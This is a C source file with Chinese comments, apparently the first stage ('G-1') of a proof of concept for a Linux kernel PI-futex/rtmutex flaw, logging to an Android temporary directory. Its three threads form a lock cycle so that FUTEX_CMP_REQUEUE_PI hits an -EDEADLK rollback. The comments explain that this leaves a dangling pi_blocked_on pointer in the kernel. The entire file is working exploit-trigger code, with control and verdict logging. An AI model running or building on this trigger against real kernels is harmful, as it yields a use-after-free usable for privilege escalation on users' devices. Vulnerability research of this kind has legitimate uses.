/*
 * g1_edeadlk.c — GhostLock G-1：验证能否进入 -EDEADLK 回滚点（漏洞必经点）
 *
 * 目标构造（三锁环，对应 §15.5 与 rtmutex.c 的分析）：
 *
 *   B = PI futex，由 W 持有
 *   C = PI futex，由 O 持有
 *   A = 普通 futex，作为 W 的 requeue 等待点
 *
 *   W: FUTEX_LOCK_PI(B)            → B 归 W
 *   O: FUTEX_LOCK_PI(C)            → C 归 O
 *   O: FUTEX_LOCK_PI(B)            → 阻塞（入队 B，O->pi_blocked_on 被置位）
 *   W: FUTEX_WAIT_REQUEUE_PI(A→C)  → W 睡在 A 上，rt_waiter 在 W 的内核栈
 *   R(主线程): FUTEX_CMP_REQUEUE_PI(A→C, nr_wake=1)
 *
 *   → rt_mutex_start_proxy_lock(C, waiter=W的rt_waiter, task=W)
 *     try_to_take 失败（C 的 owner 是 O，不是 W）
 *     task_blocks_on_rt_mutex → 入队成功、waiter->task=W、W->pi_blocked_on=&waiter
 *     → 链走查：C.owner=O → O 阻塞在 B → B.owner=W == 正在入队的 task
 *     → 命中 rtmutex.c:644 的死锁判定 → 返回 -EDEADLK
 *   → rt_mutex_start_proxy_lock: ret 非 0 且 owner 非 NULL → remove_waiter(C, waiter)
 *     此时 current = R，而 waiter->task = W
 *     → 清的是 R->pi_blocked_on（错误对象）
 *     → **W->pi_blocked_on 保持指向 &waiter，W 返回用户态后即悬垂**
 *
 * 判据：R 的 FUTEX_CMP_REQUEUE_PI 返回 -1 / EDEADLK(35)。
 *
 * 安全：触发后不做任何 PI 操作，立即 _exit；每步 fsync 落盘。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g1.log"

/* linux/futex.h 常量（避免依赖头文件版本） */
#define FUTEX_WAIT            0
#define FUTEX_WAKE            1
#define FUTEX_LOCK_PI         6
#define FUTEX_UNLOCK_PI       7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG    128

static int logfd = -1;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%8.1fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

static long futex(uint32_t *uaddr, int op, uint32_t val, void *timeout,
		  uint32_t *uaddr2, uint32_t val3)
{
	return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

/* 共享状态（线程间可见） */
struct shared {
	uint32_t A; /* 普通 futex */
	uint32_t C; /* PI futex，由 O 持有 */
	uint32_t B; /* PI futex，由 W 持有 */
	volatile int b_held;
	volatile int c_held;
	volatile int o_blocked;
	volatile int w_waiting;
};

static struct shared *S;
static int noring; /* 1 = 对照组：O 不阻塞到 B 上，PI 环不成立 */

static void *thread_w(void *arg)
{
	long r;

	(void)arg;
	/* 1) W 取得 B */
	errno = 0;
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("W: LOCK_PI(B) → %ld errno=%d", r, errno);
	if (r != 0) {
		lg("W: 无法取得 B，退出");
		return NULL;
	}
	S->b_held = 1;
	__sync_synchronize();

	/* 等 O 已被阻塞在 B 上，再进入 requeue 等待 */
	while (!S->o_blocked)
		__asm__ __volatile__("" ::: "memory");

	/* 2) W 在普通 futex A 上等待被 requeue 到 C */
	S->w_waiting = 1;
	__sync_synchronize();
	errno = 0;
	lg("W: 进入 WAIT_REQUEUE_PI(A→C)（rt_waiter 在内核栈上）");
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	lg("W: WAIT_REQUEUE_PI 返回 %ld errno=%d (%s)", r, errno,
	   strerror(errno));
	return NULL;
}

static void *thread_o(void *arg)
{
	long r;

	(void)arg;
	/* 1) O 取得 C */
	errno = 0;
	r = futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(C) → %ld errno=%d", r, errno);
	if (r != 0) {
		lg("O: 无法取得 C，退出");
		return NULL;
	}
	S->c_held = 1;
	__sync_synchronize();

	while (!S->b_held)
		__asm__ __volatile__("" ::: "memory");

	if (noring) {
		/* 对照组：O 不尝试取 B，PI 环不成立；保持持有 C 不释放 */
		S->o_blocked = 1;
		__sync_synchronize();
		lg("O: [对照组] 不阻塞到 B（环不成立），保持持有 C");
		while (1)
			usleep(100000);
	}

	/* 2) O 尝试取 B → 阻塞（W 持有 B），入队 B，pi_blocked_on 被置位 */
	S->o_blocked = 1;
	__sync_synchronize();
	errno = 0;
	lg("O: 进入 LOCK_PI(B)（预期阻塞）");
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(B) 返回 %ld errno=%d (%s)（若被唤醒则说明环被打破）",
	   r, errno, strerror(errno));
	return NULL;
}

int main(int argc, char **argv)
{
	noring = (argc > 1 && strcmp(argv[1], "noring") == 0);
	pthread_t tw, to;
	long r;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G-1 start pid=%d mode=%s =====", getpid(), noring ? "NORING(对照)" : "RING(正常)");
	sync_log();

	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) {
		lg("mmap FAIL errno=%d", errno);
		return 1;
	}
	S->A = S->B = S->C = 0;

	if (pthread_create(&tw, NULL, thread_w, NULL) ||
	    pthread_create(&to, NULL, thread_o, NULL)) {
		lg("pthread_create FAIL");
		return 1;
	}

	/* 等 W 睡在 A 上、O 阻塞在 B 上 */
	{
		int spin = 0;
		while ((!S->w_waiting || !S->o_blocked) && spin < 3000) {
			usleep(1000);
			spin++;
		}
		lg("同步完成: b_held=%d c_held=%d o_blocked=%d w_waiting=%d",
		   S->b_held, S->c_held, S->o_blocked, S->w_waiting);
		sync_log();
	}

	/* 留出让 W 真正进入内核等待的时间 */
	usleep(100000);

	lg("R: 进入 CMP_REQUEUE_PI(A→C, nr_wake=1) —— 预期 -EDEADLK");
	sync_log();
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("R: CMP_REQUEUE_PI 返回 %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();

	lg("---- 判定 ----");
	if (r == -1 && e == EDEADLK)
		lg("verdict: 命中 -EDEADLK 回滚点 → remove_waiter 已在错误上下文执行");
	else if (r >= 0)
		lg("verdict: 未命中（返回 %ld，环未形成或已被打破）", r);
	else
		lg("verdict: 其他错误 errno=%d (%s)", e, strerror(e));
	lg("立即退出，不做任何后续 PI 操作");
	sync_log();

	/* 不 join：W/O 仍在系统调用中；直接终止进程 */
	_exit(0);
}
